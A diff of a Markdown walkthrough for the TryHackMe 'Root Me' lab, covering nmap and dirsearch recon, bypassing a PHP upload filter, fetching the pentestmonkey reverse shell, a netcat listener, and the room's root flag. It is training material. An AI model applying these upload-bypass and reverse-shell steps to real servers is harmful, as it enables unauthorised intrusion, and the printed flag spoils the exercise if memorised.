@@ -1,16 +1,18 @@
-# <div align="center">Root me</div>
+# <div align="center">Root Me - TryHackMe Walkthrough</div>
 
+## Step 1: Reconnaissance
 
+We start with a basic Nmap scan to identify open ports and services running on the target machine.
 
-step 1: Recone
-```
+```bash
 nmap <ip> -sV -sC
 ```
-Scan results
-```
+
+### Scan Results:
+
+```bash
 nmap 10.10.15.83 -sV -sC 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07
- 11:10 IST
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 11:10 IST
 Nmap scan report for 10.10.15.83
 Host is up (0.15s latency).
 Not shown: 998 closed tcp ports (conn-refused)
@@ -30,86 +32,103 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-step 2: Enemurating web
-for enemurating im using dirsearch
-```
+---
+
+## Step 2: Web Enumeration
+
+![Upload Panel](https://github.com/user-attachments/assets/a5791bd9-2b57-42a5-9274-53fb2bce9a57)
+
+For directory enumeration, I used `dirsearch` to find hidden files and directories on the web server.
+
+```bash
 dirsearch -u 10.10.15.83
 ```
-Results
-```
-death@esther:~$ dirsearch -u 10.10.15.83
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
 
-  _|. _ _  _  _  _ _|_    v0.4.3
- (_||| _) (/_(_|| (_| )
+### Results:
+
+```bash
+dirsearch -u 10.10.15.83
+
+_|. _ _  _  _  _ _|_    v0.4.3
+(_||| _) (/_(_|| (_| )
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /home/death/reports/_10.10.15.83/_25-04-07_11-10-52.txt
-
 Target: http://10.10.15.83/
 
-[11:10:52] Starting: 
 [11:10:57] 301 -  307B  - /js  ->  http://10.10.15.83/js/
-[11:11:01] 403 -  276B  - /.ht_wsr.txt
-[11:11:01] 403 -  276B  - /.htaccessOLD
-[11:11:01] 403 -  276B  - /.htaccess_orig
 [11:11:01] 403 -  276B  - /.htaccessBAK
-[11:11:01] 403 -  276B  - /.htaccess_extra
-[11:11:01] 403 -  276B  - /.htaccess.save
-[11:11:01] 403 -  276B  - /.htaccess_sc
-[11:11:01] 403 -  276B  - /.htm
-[11:11:01] 403 -  276B  - /.htaccess.sample
-[11:11:01] 403 -  276B  - /.htaccess.bak1
-[11:11:01] 403 -  276B  - /.htaccessOLD2
-[11:11:01] 403 -  276B  - /.htaccess.orig
-[11:11:01] 403 -  276B  - /.html
 [11:11:01] 403 -  276B  - /.htpasswd_test
-[11:11:01] 403 -  276B  - /.htpasswds
-[11:11:01] 403 -  276B  - /.httr-oauth
-[11:11:03] 403 -  276B  - /.php
+[11:11:01] 403 -  276B  - /.php
 [11:11:32] 301 -  308B  - /css  ->  http://10.10.15.83/css/
 [11:11:45] 200 -  463B  - /js/
 [11:11:56] 301 -  310B  - /panel  ->  http://10.10.15.83/panel/
 [11:11:56] 200 -  388B  - /panel/
 [11:12:06] 403 -  276B  - /server-status
-[11:12:06] 403 -  276B  - /server-status/
 [11:12:16] 301 -  312B  - /uploads  ->  http://10.10.15.83/uploads/
 [11:12:16] 200 -  404B  - /uploads/
 
 Task Completed
 ```
 
-Step 3 we find a hidden page or pannel to upload file
+## Step 3: Finding Upload Page
 
-![image](https://github.com/user-attachments/assets/a5791bd9-2b57-42a5-9274-53fb2bce9a57)
+We found a hidden page `/panel/` which has a file upload functionality.
 
-![image](https://github.com/user-attachments/assets/390c5728-be75-4daa-82a1-83dd68b351c7)
+### Upload Page:
 
-It allow some types as i check thorugh by uploading like jpg, txt and png and .php is not allowed
+![Upload Restriction](https://github.com/user-attachments/assets/390c5728-be75-4daa-82a1-83dd68b351c7)
 
-![image](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)
+---
 
-Let Upload a php reverser-shell, im using [penttest monkey reverse shell](https://github.com/pentestmonkey/php-reverse-shell)
+## File Upload Restrictions
 
-![image](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
+After testing multiple file types like `.jpg`, `.txt`, and `.png`, it was confirmed that `.php` files were restricted.
 
-download guide 
-```
+![Upload Reverse Shell](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)
+
+---
+
+## Uploading Reverse Shell
+
+To bypass the restriction and get a reverse shell, we use a PHP reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).
+
+Download the reverse shell using:
+
+![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
+
+```bash
 git clone https://github.com/pentestmonkey/php-reverse-shell
 cd php-reverse-shell
 nano php-reverse-shell.php 
 ```
 ![image](https://github.com/user-attachments/assets/dc7b1ca7-5c11-4d95-9aeb-8db32fb7de0e)
 
-Replace this ip with your thm vpn ip 
+Replace the IP with your THM VPN IP.
 
-and open another terminal and use nc to get reverse shell connection,
-```
-nc -lnvp 1234
+---
+
+### Uploading the Reverse Shell:
+
+![Upload Reverse Shell](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)
+
+---
+
+## Setting up Listener
+
+In a separate terminal, start a Netcat listener:
+
+```bash
+nc -lvnp <your-port>
 ```
 
+Once the file is uploaded successfully, trigger the shell by navigating to the uploaded file path.
+
+---
+
+### Reverse Shell Captured:
+
+![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
 Let upload a shell i rename as shell.php
 ![image](https://github.com/user-attachments/assets/1e8ee09a-173d-44bc-bee5-9c90655200c4)
 
@@ -264,136 +283,3 @@ cat /root/root.txt
 THM{pr1v1l3g3_3sc4l4t10n}
 # 
 ```
-
----
-
-# <div align="center">Root Me - TryHackMe Walkthrough</div>
-
-## Step 1: Reconnaissance
-
-We start with a basic Nmap scan to identify open ports and services running on the target machine.
-
-```bash
-nmap <ip> -sV -sC
-```
-
-### Scan Results:
-
-```bash
-nmap 10.10.15.83 -sV -sC 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 11:10 IST
-Nmap scan report for 10.10.15.83
-Host is up (0.15s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
-|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
-|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: HackIT - Home
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
----
-
-## Step 2: Web Enumeration
-
-![Upload Panel](https://github.com/user-attachments/assets/a5791bd9-2b57-42a5-9274-53fb2bce9a57)
-
-For directory enumeration, I used `dirsearch` to find hidden files and directories on the web server.
-
-```bash
-dirsearch -u 10.10.15.83
-```
-
-### Results:
-
-```bash
-dirsearch -u 10.10.15.83
-
-_|. _ _  _  _  _ _|_    v0.4.3
-(_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Target: http://10.10.15.83/
-
-[11:10:57] 301 -  307B  - /js  ->  http://10.10.15.83/js/
-[11:11:01] 403 -  276B  - /.htaccessBAK
-[11:11:01] 403 -  276B  - /.htpasswd_test
-[11:11:01] 403 -  276B  - /.php
-[11:11:32] 301 -  308B  - /css  ->  http://10.10.15.83/css/
-[11:11:45] 200 -  463B  - /js/
-[11:11:56] 301 -  310B  - /panel  ->  http://10.10.15.83/panel/
-[11:11:56] 200 -  388B  - /panel/
-[11:12:06] 403 -  276B  - /server-status
-[11:12:16] 301 -  312B  - /uploads  ->  http://10.10.15.83/uploads/
-[11:12:16] 200 -  404B  - /uploads/
-
-Task Completed
-```
-
-## Step 3: Finding Upload Page
-
-We found a hidden page `/panel/` which has a file upload functionality.
-
-### Upload Page:
-
-![Upload Restriction](https://github.com/user-attachments/assets/390c5728-be75-4daa-82a1-83dd68b351c7)
-
----
-
-## File Upload Restrictions
-
-After testing multiple file types like `.jpg`, `.txt`, and `.png`, it was confirmed that `.php` files were restricted.
-
-![Upload Reverse Shell](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)
-
----
-
-## Uploading Reverse Shell
-
-To bypass the restriction and get a reverse shell, we use a PHP reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).
-
-Download the reverse shell using:
-
-![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
-
-```bash
-git clone https://github.com/pentestmonkey/php-reverse-shell
-cd php-reverse-shell
-nano php-reverse-shell.php 
-```
-
-Replace the IP with your THM VPN IP.
-
----
-
-### Uploading the Reverse Shell:
-
-![Upload Reverse Shell](https://github.com/user-attachments/assets/0829c5f3-101f-4fda-bb22-16cedbe42a88)
-
----
-
-## Setting up Listener
-
-In a separate terminal, start a Netcat listener:
-
-```bash
-nc -lvnp <your-port>
-```
-
-Once the file is uploaded successfully, trigger the shell by navigating to the uploaded file path.
-
----
-
-### Reverse Shell Captured:
-
-![Reverse Shell](https://github.com/user-attachments/assets/19f28f5b-098b-41a4-b576-53322a3084ab)
